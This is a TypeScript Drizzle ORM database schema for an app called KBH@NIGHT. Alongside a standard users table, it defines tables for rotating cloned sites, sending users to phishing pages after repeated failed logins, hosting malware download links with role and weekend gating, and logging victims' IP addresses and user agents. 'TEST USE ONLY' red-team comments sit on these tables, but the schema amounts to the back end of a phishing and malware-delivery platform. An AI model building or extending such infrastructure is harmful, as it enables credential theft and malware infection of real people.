import { int, mysqlEnum, mysqlTable, text, timestamp, varchar, boolean } from "drizzle-orm/mysql-core";

/**
 * Core user table backing auth flow.
 * Extend this file with additional tables as your product grows.
 * Columns use camelCase to match both database fields and generated types.
 */
export const users = mysqlTable("users", {
  /**
   * Surrogate primary key. Auto-incremented numeric value managed by the database.
   * Use this for relations between tables.
   */
  id: int("id").autoincrement().primaryKey(),
  /** Manus OAuth identifier (openId) returned from the OAuth callback. Unique per user. */
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: mysqlEnum("role", ["user", "admin"]).default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export type User = typeof users.$inferSelect;
export type InsertUser = typeof users.$inferInsert;

/**
 * KBH@NIGHT Member Management
 * TEST USE ONLY - For authorized red team testing within defined scope
 */
export const members = mysqlTable("members", {
  id: int("id").autoincrement().primaryKey(),
  userId: int("userId").notNull(),
  username: varchar("username", { length: 128 }).notNull().unique(),
  role: mysqlEnum("role", ["admin", "operator", "member"]).default("member").notNull(),
  status: mysqlEnum("status", ["active", "inactive", "suspended"]).default("active").notNull(),
  encryptedCredentials: text("encryptedCredentials"),
  deviceLinked: boolean("deviceLinked").default(false),
  lastActivity: timestamp("lastActivity"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Member = typeof members.$inferSelect;
export type InsertMember = typeof members.$inferInsert;

/**
 * Forum Messages
 * TEST USE ONLY - For authorized red team testing
 */
export const forumMessages = mysqlTable("forumMessages", {
  id: int("id").autoincrement().primaryKey(),
  memberId: int("memberId").notNull(),
  username: varchar("username", { length: 128 }).notNull(),
  message: text("message").notNull(),
  encryptedContent: text("encryptedContent"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type ForumMessage = typeof forumMessages.$inferSelect;
export type InsertForumMessage = typeof forumMessages.$inferInsert;

/**
 * Site Cloning Configuration
 * TEST USE ONLY - Dynamic site rotation for authorized testing
 */
export const siteClones = mysqlTable("siteClones", {
  id: int("id").autoincrement().primaryKey(),
  name: varchar("name", { length: 256 }).notNull(),
  clonedUrl: text("clonedUrl").notNull(),
  originalUrl: text("originalUrl").notNull(),
  isActive: boolean("isActive").default(false),
  rotationSchedule: varchar("rotationSchedule", { length: 64 }),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type SiteClone = typeof siteClones.$inferSelect;
export type InsertSiteClone = typeof siteClones.$inferInsert;

/**
 * Phishing Redirection Configuration
 * TEST USE ONLY - Redirect failed auth attempts to phishing sites
 */
export const phishingRedirects = mysqlTable("phishingRedirects", {
  id: int("id").autoincrement().primaryKey(),
  name: varchar("name", { length: 256 }).notNull(),
  targetUrl: text("targetUrl").notNull(),
  triggerFailedAttempts: int("triggerFailedAttempts").default(3),
  isActive: boolean("isActive").default(false),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type PhishingRedirect = typeof phishingRedirects.$inferSelect;
export type InsertPhishingRedirect = typeof phishingRedirects.$inferInsert;

/**
 * Malware Distribution Configuration
 * TEST USE ONLY - Admin-controlled download links for testing
 */
export const malwareDistribution = mysqlTable("malwareDistribution", {
  id: int("id").autoincrement().primaryKey(),
  name: varchar("name", { length: 256 }).notNull(),
  description: text("description"),
  downloadUrl: text("downloadUrl").notNull(),
  fileHash: varchar("fileHash", { length: 256 }),
  fileSize: int("fileSize"),
  version: varchar("version", { length: 32 }),
  isActive: boolean("isActive").default(false),
  requiredRole: mysqlEnum("requiredRole", ["admin", "operator", "member"]).default("member"),
  weekendAccessOnly: boolean("weekendAccessOnly").default(false),
  downloadCount: int("downloadCount").default(0),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type MalwareDistribution = typeof malwareDistribution.$inferSelect;
export type InsertMalwareDistribution = typeof malwareDistribution.$inferInsert;

/**
 * Authentication Attempt Tracking
 * TEST USE ONLY - Track failed attempts for phishing redirection
 */
export const authAttempts = mysqlTable("authAttempts", {
  id: int("id").autoincrement().primaryKey(),
  ipAddress: varchar("ipAddress", { length: 45 }),
  username: varchar("username", { length: 128 }),
  success: boolean("success").default(false),
  attemptCount: int("attemptCount").default(1),
  lastAttempt: timestamp("lastAttempt").defaultNow(),
  redirectedToPhishing: boolean("redirectedToPhishing").default(false),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
});

export type AuthAttempt = typeof authAttempts.$inferSelect;
export type InsertAuthAttempt = typeof authAttempts.$inferInsert;

/**
 * Download Tracking
 * TEST USE ONLY - Track malware distribution for compliance
 */
export const downloadTracking = mysqlTable("downloadTracking", {
  id: int("id").autoincrement().primaryKey(),
  memberId: int("memberId"),
  malwareId: int("malwareId").notNull(),
  ipAddress: varchar("ipAddress", { length: 45 }),
  userAgent: text("userAgent"),
  downloadedAt: timestamp("downloadedAt").defaultNow().notNull(),
});

export type DownloadTracking = typeof downloadTracking.$inferSelect;
export type InsertDownloadTracking = typeof downloadTracking.$inferInsert;

export const runners = mysqlTable("runners", {
  id: int("id").autoincrement().primaryKey(),
  username: varchar("username", { length: 128 }).notNull().unique(),
  code: varchar("code", { length: 64 }).notNull(),
  status: mysqlEnum("status", ["active", "inactive", "suspended"]).default("active").notNull(),
  profileImage: text("profileImage"),
  bio: text("bio"),
  phone: varchar("phone", { length: 20 }),
  appVersion: varchar("appVersion", { length: 20 }).default("1.0.0"),
  lastActive: timestamp("lastActive").defaultNow(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type Runner = typeof runners.$inferSelect;
export type InsertRunner = typeof runners.$inferInsert;

export const runnerMessages = mysqlTable("runnerMessages", {
  id: int("id").autoincrement().primaryKey(),
  runnerId: int("runnerId").notNull().references(() => runners.id),
  subject: varchar("subject", { length: 255 }).notNull(),
  message: text("message").notNull(),
  status: mysqlEnum("status", ["unread", "read", "replied"]).default("unread").notNull(),
  adminReply: text("adminReply"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().onUpdateNow().notNull(),
});

export type RunnerMessage = typeof runnerMessages.$inferSelect;
export type InsertRunnerMessage = typeof runnerMessages.$inferInsert;

export const appDownloads = mysqlTable("appDownloads", {
  id: int("id").autoincrement().primaryKey(),
  runnerId: int("runnerId").notNull().references(() => runners.id),
  platform: mysqlEnum("platform", ["ios", "android"]).notNull(),
  version: varchar("version", { length: 20 }).notNull(),
  downloadUrl: text("downloadUrl").notNull(),
  downloadedAt: timestamp("downloadedAt").defaultNow().notNull(),
});

export type AppDownload = typeof appDownloads.$inferSelect;
export type InsertAppDownload = typeof appDownloads.$inferInsert;